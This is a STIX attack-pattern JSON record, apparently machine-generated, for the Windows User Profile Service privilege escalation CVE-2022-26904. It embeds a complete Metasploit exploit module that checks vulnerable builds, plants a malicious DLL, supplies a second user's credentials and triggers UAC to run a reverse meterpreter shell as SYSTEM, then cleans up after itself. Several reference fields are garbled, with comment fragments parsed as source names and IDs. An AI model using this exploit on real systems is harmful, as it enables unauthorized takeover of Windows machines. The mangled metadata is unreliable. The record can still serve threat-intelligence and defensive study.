{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2bcd2015-1617-40f6-af09-dddbe5dfdeb7",
    "created": "2024-08-14T16:49:08.827425Z",
    "modified": "2024-08-14T16:49:08.827429Z",
    "name": "User Profile Arbitrary Junction Creation Local Privilege Elevation",
    "description": " The user profile service, identified as ProfSrv, is vulnerable to a local privilege elevation vulnerability in its CreateDirectoryJunction() function due to a lack of appropriate checks on the directory structure of the junctions it tries to link together.  Attackers can leverage this vulnerability to plant a malicious DLL in a system directory and then trigger a UAC prompt to cause this DLL to be loaded and executed by ProfSrv as the NT AUTHORITY\\SYSTEM user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/cve_2022_26904_superprofile.rb",
            "external_id": "cve_2022_26904_superprofile.rb"
        },
        {
            "source_name": "CVE-2022-21919",
            "external_id": "howeverbothpatcheswerefoundtobeinsufficient.Thisbugisapatchbypassfor"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-26904"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/klinix5/ProfSvcLPE/blob/main/write-up.docx#Discussionofpreviousiterationsofthisbugprovidinginsightintopatchedfunctionality."
        },
        {
            "source_name": "#Buildnumberstakenfromhttps://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-26904",
            "external_id": "andassociated"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Version\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::ReflectiveDLLInjection\n  include Msf::Exploit::EXE # Needed for generate_payload_dll\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'User Profile Arbitrary Junction Creation Local Privilege Elevation',\n          'Description' => %q{\n            The user profile service, identified as ProfSrv, is vulnerable to a local privilege elevation vulnerability\n            in its CreateDirectoryJunction() function due to a lack of appropriate checks on the directory structure of\n            the junctions it tries to link together.\n\n            Attackers can leverage this vulnerability to plant a malicious DLL in a system directory and then trigger a\n            UAC prompt to cause this DLL to be loaded and executed by ProfSrv as the NT AUTHORITY\\SYSTEM user.\n\n            Note that this bug was originally identified as CVE-2021-34484 and was subsequently patched a second time as\n            CVE-2022-21919, however both patches were found to be insufficient. This bug is a patch bypass for\n            CVE-2022-21919 and at the time of publishing, has not yet been patched, though plans are in place to patch it\n            as CVE-2022-26904.\n\n            It is important to note that the credentials supplied for the second user to log in as in this exploit must be\n            those of a normal non-admin user and these credentials must also corralate with a user who has already logged in\n            at least once before. Additionally the current user running the exploit must have UAC set to the highest level,\n            aka \"Always Notify Me When\", in order for the code to be executed as NT AUTHORITY\\SYSTEM. Note however that\n            \"Always Notify Me When\" is the default UAC setting on common Windows installs, so this would only affect instances\n            where this setting has been changed either manually or as part of the installation process.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'KLINIX5', # Aka Abdelhamid Naceri. Original PoC w Patch Bypass\n            'Grant Willcox' # Metasploit module + Tweaks to PoC\n          ],\n          'Arch' => [ ARCH_X64 ],\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'Targets' => [\n            [ 'Windows 11', { 'Arch' => ARCH_X64 } ]\n          ],\n          'References' => [\n            ['CVE', '2022-26904'],\n            ['URL', 'https://github.com/rmusser01/SuperProfile'], # Original link was at https://github.com/klinix5/SuperProfile/ but was taken down. This is a backup.\n            ['URL', 'https://web.archive.org/web/20220222105232/https://halove23.blogspot.com/2022/02/blog-post.html'], # Original blog post\n            ['URL', 'https://github.com/klinix5/ProfSvcLPE/blob/main/write-up.docx'] # Discussion of previous iterations of this bug providing insight into patched functionality.\n          ],\n          'DisclosureDate' => '2022-03-17', # Date MSRC supplied CVE number, bug is not patched atm.\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [ CRASH_SAFE, ],\n            'Reliability' => [ REPEATABLE_SESSION ], # Will need to double check this as this may require some updates to the code to get it to the point where it can be used repetitively.\n            'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, SCREEN_EFFECTS, AUDIO_EFFECTS ]\n          },\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread',\n            'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',\n            'WfsDelay' => 300\n          },\n          'AKA' => [ 'SuperProfile' ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('LOGINUSER', [true, 'Username of the secondary normal privileged user to log in as. Cannot be the same as the current user!']),\n      OptString.new('LOGINDOMAIN', [true, 'Domain that the LOGINUSER belongs to. Ensures we log into the right domain.', '.']),\n      OptString.new('LOGINPASSWORD', [true, 'Password for the secondary normal privileged user to log in as'])\n    ])\n  end\n\n  def check\n    sysinfo_value = sysinfo['OS']\n\n    if sysinfo_value !~ /windows/i\n      # Non-Windows systems are definitely not affected.\n      return CheckCode::Safe('Target is not a Windows system, so it is not affected by this vulnerability!')\n    end\n\n    # see https://docs.microsoft.com/en-us/windows/release-information/\n    version = get_version_info\n    unless version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Win10_21H2) ||\n           version.build_number == Msf::WindowsVersion::Win11_21H2 ||\n           version.build_number == Msf::WindowsVersion::Server2022\n      return CheckCode::Safe('Target is not running a vulnerable version of Windows!')\n    end\n\n    print_status('Checking if PromptOnSecureDesktop mitigation applied...')\n    reg_key = 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'\n    reg_val = 'PromptOnSecureDesktop'\n    begin\n      root_key, base_key = @session.sys.registry.splitkey(reg_key)\n      value = @session.sys.registry.query_value_direct(root_key, base_key, reg_val)\n    rescue Rex::Post::Meterpreter::RequestError => e\n      return CheckCode::Unknown(\"Was not able to retrieve the PromptOnSecureDesktop value. Error was #{e}\")\n    end\n\n    if value.data == 0\n      return CheckCode::Safe('PromptOnSecureDesktop is set to 0, mitigation applied!')\n    elsif value.data == 1\n      print_good('PromptOnSecureDesktop is set to 1, should be safe to proceed!')\n    else\n      return CheckCode::Unknown(\"PromptOnSecureDesktop was not set to a known value, are you sure the target system isn't corrupted?\")\n    end\n\n    # Build numbers taken from https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-26904, and associated\n    # security update information (e.g. https://support.microsoft.com/en-us/topic/windows-10-update-history-857b8ccb-71e4-49e5-b3f6-7073197d98fb,\n    # https://support.microsoft.com/en-us/topic/windows-11-version-21h2-update-history-a19cd327-b57f-44b9-84e0-26ced7109ba9)\n    if version.build_number == Msf::WindowsVersion::Win11_21H2 && version.build_number.revision_number.between?(0, 612)\n      return CheckCode::Appears('Vulnerable Windows 11 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Server2022 && version.build_number.revision_number.between?(0, 642)\n      return CheckCode::Appears('Vulnerable Windows Server 2022 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_21H2 && version.build_number.revision_number.between?(0, 1644)\n      return CheckCode::Appears('Vulnerable Windows 10 21H2 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_21H1 && version.build_number.revision_number.between?(0, 1644)\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 21H1 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_20H2 && version.build_number.revision_number.between?(0, 1644)\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 20H2 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_2004\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 v2004 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1909 && version.build_number.revision_number.between?(0, 2211)\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 v1909 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1903\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 v1903 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1809 && version.build_number.revision_number.between?(0, 2802)\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 v1809 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1803\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 v1803 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1709\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 v1709 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1703\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 v1703 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1607 && version.build_number.revision_number.between?(0, 5065)\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 v1607 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1511\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 v1511 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win10_1507\n      target_not_presently_supported\n      return CheckCode::Appears('Vulnerable Windows 10 v1507 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win81 # Includes Server 2012 R2\n      target_not_presently_supported\n      return CheckCode::Detected('Windows 8.1/Windows Server 2012 R2 build detected!')\n    elsif version.build_number == Msf::WindowsVersion::Win8 # Includes Server 2012\n      target_not_presently_supported\n      return CheckCode::Detected('Windows 8/Windows Server 2012 build detected!')\n    elsif version.build_number.between?(Msf::WindowsVersion::Win7_SP0, Msf::WindowsVersion::Win7_SP1) # Includes Server 2008 R2\n      target_not_presently_supported\n      return CheckCode::Detected('Windows 7/Windows Server 2008 R2 build detected!')\n    elsif version.build_number.between?(Msf::WindowsVersion::Server2008_SP0, Msf::WindowsVersion::Server2008_SP2_Update) # Includes Server 2008\n      target_not_presently_supported\n      return CheckCode::Detected('Windows Server 2008/Windows Server 2008 SP2 build detected!')\n    else\n      return CheckCode::Safe('The build number of the target machine does not appear to be a vulnerable version!')\n    end\n  end\n\n  def target_not_presently_supported\n    print_warning('This target is not presently supported by this exploit. Support may be added in the future!')\n    print_warning('Attempts to exploit this target with this module WILL NOT WORK!')\n  end\n\n  def check_target_is_running_supported_windows_version\n    if !sysinfo['OS'].include?('Windows')\n      fail_with(Failure::NotVulnerable, 'Target is not running Windows!')\n    elsif get_version_info.build_number < Msf::WindowsVersion::Win10_InitialRelease\n      fail_with(Failure::NoTarget, 'Target is running Windows, but not a version this module supports! Bailing...')\n    end\n  end\n\n  def exploit\n    # Step 1: Check target environment is correct.\n    print_status('Step #1: Checking target environment...')\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n    check_target_is_running_supported_windows_version\n\n    # Step 2: Generate the malicious DLL and upload it to a temp location.\n    payload_dll = generate_payload_dll\n    print_status(\"Payload DLL is #{payload_dll.length} bytes long\")\n    temp_directory = session.sys.config.getenv('%TEMP%')\n    malicious_dll_location = \"#{temp_directory}\\\\#{Rex::Text.rand_text_alpha(6..13)}.dll\"\n    print_status(\"Writing malicious DLL to #{malicious_dll_location}\")\n    write_file(malicious_dll_location, payload_dll)\n\n    print_status('Marking DLL as full access for Everyone so that there are no access issues as the secondary user...')\n    cmd_exec(\"icacls #{malicious_dll_location} /grant Everyone:(F)\")\n    register_file_for_cleanup(malicious_dll_location)\n\n    # Register the directories we create for cleanup\n    register_dir_for_cleanup('C:\\\\Windows\\\\System32\\\\Narrator.exe.Local')\n    register_dir_for_cleanup('C:\\\\Users\\\\TEMP')\n\n    # Step 3: Load the main DLL that will trigger the exploit and conduct the arbitrary file copy.\n    print_status('Step #3: Loading the exploit DLL to run the main exploit...')\n    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2022-26904', 'CVE-2022-26904.dll')\n    library_path = ::File.expand_path(library_path)\n\n    dll_info_parameter = datastore['LOGINUSER'].to_s + '||' + datastore['LOGINDOMAIN'].to_s + '||' + datastore['LOGINPASSWORD'].to_s + '||' + malicious_dll_location.to_s\n\n    @session_obtained_bool = false\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation, and the credentials for the second user.\n    execute_dll(library_path, dll_info_parameter)\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n    print_warning(\"Cleanup may not occur automatically if you aren't using a Meterpreter payload so make sure to run the following command upon session completion:\")\n    print_warning('taskkill /IM \"consent.exe\" /F || taskkill /IM \"narrator.exe\" /F || taskkill /IM \"narratorquickstart.exe\" /F || taskkill /IM \"msiexec.exe\" || rmdir /q /s C:\\Users\\TEMP || rmdir /q /s C:\\Windows\\System32\\Narrator.exe.local')\n    print_warning('You may need to run this more than once to ensure these files are properly deleted and Narrator.exe actually closes!')\n\n    print_status('Sleeping for 60 seconds before trying to spawn UserAccountControlSettings.exe as a backup.')\n    print_status('If you get a shell back before this, feel free to CTRL+C once the shell has successfully returned.')\n    sleep(60)\n    if (@session_obtained_bool == false)\n      # Execute a command that requires elevation to cause the UAC prompt to appear. For some reason the DLL code itself\n      # triggering the UAC prompt won't work at times so this is the best way of solving this issue for cases where this happens.\n      begin\n        cmd_exec('UserAccountControlSettings.exe')\n      rescue Rex::TimeoutError\n        print_warning('Will need to get user to click on the flashing icon in the taskbar to open the UAC prompt and give us shells!')\n      end\n    end\n  end\n\n  def on_new_session(new_session)\n    @session_obtained_bool = true\n    old_session = @session\n    @session = new_session\n    if new_session.type == 'meterpreter'\n      consent_pids = pidof('consent.exe')\n      for id in consent_pids\n        @session.sys.process.kill(id)\n      end\n      sleep(5) # Needed as otherwise later folder deletion calls sometimes fail, and additional Narrator.exe processes\n      # can sometimes spawn a few seconds after we close consent.exe so we want to grab all of them at once.\n      narrator_pids = pidof('Narrator.exe')\n      for id in narrator_pids\n        @session.sys.process.kill(id)\n      end\n      narrator_pids = pidof('NarratorQuickStart.exe')\n      for id in narrator_pids\n        @session.sys.process.kill(id)\n      end\n      narrator_pids = pidof('msiexec.exe')\n      for id in narrator_pids\n        @session.sys.process.kill(id)\n      end\n    else\n      # If it is another session type such as shell or PowerShell we will need to execute the command\n      # normally using cmd_exec() to cleanup, as it doesn't seem we have a built in option to kill processes\n      # by name or PIDs as library functions for these session types.\n      cmd_exec('taskkill /IM \"consent.exe\" /F')\n      sleep(5)\n      cmd_exec('taskkill /IM \"narrator.exe\" /F')\n      cmd_exec('taskkill /IM \"narratorquickstart.exe\" /F')\n      cmd_exec('taskkill /IM \"msiexec.exe\" /F')\n    end\n\n    rm_rf('C:\\\\Windows\\\\System32\\\\Narrator.exe.local')\n    for _i in range(1..3)\n      rm_rf('C:\\\\Users\\\\TEMP') # Try deleting this 3 times just to be sure.\n    end\n    @session = old_session\n    super\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "win'"
    ]
}